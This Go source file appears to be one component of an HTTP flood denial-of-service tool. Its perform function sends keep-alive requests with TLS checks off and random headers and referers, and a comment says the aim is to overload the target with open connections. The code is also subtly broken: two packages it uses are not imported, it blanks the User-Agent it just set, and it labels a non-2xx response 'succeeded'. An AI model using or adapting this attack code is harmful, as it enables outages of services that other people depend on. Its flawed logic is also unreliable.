//go:build syn
// +build syn

package flood

import (
	"context"
	"math/rand"
	"net/http"
	"strconv"
	"strings"
	"time"
)

func (t *Target) perform(ctx context.Context, addr string) error {
	// This might backfire due to thread limit panic, but this will overload the target with open connections
	tr := &http.Transport{
		MaxIdleConns:       10,
		IdleConnTimeout:    30 * time.Second,
		DisableCompression: false,
		TLSClientConfig:    &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr}

	ctx, cancel := context.WithTimeout(ctx, time.Minute*5)
	defer cancel()

	method := "GET"

	request, err := http.NewRequestWithContext(ctx, method, addr, nil)
	if err != nil {
		return err
	}
	request.Header["Connection"] = []string{"Keep-Alive"}
	request.Header["User-Agent"] = []string{userAgent()}
	accept := acceptall[rand.Intn(len(acceptall))]
	request.Header["User-Agent"] = []string{}
	for _, l := range strings.Split(accept, "\r\n") {
		if l == "" {
			continue
		}
		h := strings.Split(l, ": ")
		request.Header.Add(h[0], h[1])
	}
	request.Header["Referrer"] = []string{referers[rand.Intn(len(referers))]}

	body, err := client.Do(request)
	if err == nil {
		body.Body.Close()
		if body.StatusCode/100 != 2 {
			return errors.New("succeeded")
		}
	}
	return err
}
